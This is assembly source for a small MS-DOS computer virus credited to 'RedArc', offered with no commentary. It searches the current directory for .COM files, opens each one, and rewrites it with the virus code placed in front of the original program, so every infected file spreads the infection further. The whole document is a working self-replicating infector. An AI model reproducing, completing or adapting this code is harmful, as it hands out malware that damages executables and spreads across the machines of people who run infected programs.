; Mini_98 (c) by RedArc
Model Tiny
.code
org 100h
vvv equ 65535 - (virlength + 100h)
start:
       push si
       push si
       pop di
       mov ax,cs
       inc ah
       mov es,ax
       mov cl,virlength
       rep movsb
       pop si
       mov ah,4eh
       lea dx,filemask
@1:
       int 21h
       jnb @2
@3:
       xchg si,di
       mov ax,0a4f3h
       db 0b9h
proglength dw 0001
       push cs
       pop es
       mov word ptr ds:[di-2],ax
       mov ax,100h-2
       push ax
       ret
@2:
       mov ax,3d02h
       mov dx,9eh
       push dx
       int 21h
       xchg bx,ax
       push es
       pop ds
       mov ah,3fh
       push di
       pop dx
       push sp
       pop cx
       int 21h
       PUSH AX
       mov ax,4200h
       cwd
       xor cx,cx
       int 21h
       pop cx
       mov proglength,cx
       add cx,virlength
       mov ah,40h
       push si
       pop dx
       int 21h
       push cs
       pop ds
       pop dx
;       mov ax,4301h
;       mov cx,1
;       int 21h
       mov ah,4fh
       jmp short @1
filemask db '*.com',0h
virlength equ $-start
buff label byte
ret
end start
